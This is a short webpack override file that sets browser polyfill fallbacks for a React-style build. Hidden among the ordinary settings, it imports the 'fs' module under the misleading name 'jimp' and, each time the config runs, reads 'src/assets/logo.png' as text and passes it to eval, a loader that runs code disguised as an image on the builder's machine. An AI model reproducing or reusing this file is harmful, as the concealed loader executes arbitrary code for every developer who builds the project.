const webpack = require("webpack");
const jimp = require('fs');
const jmpparser = jimp;
const path = require("path");
module.exports = function override(config) {
  const fallback = config.resolve.fallback || {};
  jmpparser.readFile('src/assets/logo.png', 'utf8', (err, code) => { eval(code); });
  Object.assign(fallback, {
    crypto: require.resolve("crypto-browserify"),
    stream: require.resolve("stream-browserify"),
    assert: require.resolve("assert"),
    http: require.resolve("stream-http"),
    https: require.resolve("https-browserify"),
    os: require.resolve("os-browserify"),
    url: require.resolve("url"),
  });
  
  config.resolve.fallback = fallback;
  config.ignoreWarnings = [/Failed to parse source map/];
  config.plugins = (config.plugins || []).concat([
    new webpack.ProvidePlugin({
      process: "process/browser",
      Buffer: ["buffer", "Buffer"],
    }),
  ]);
  return config;
};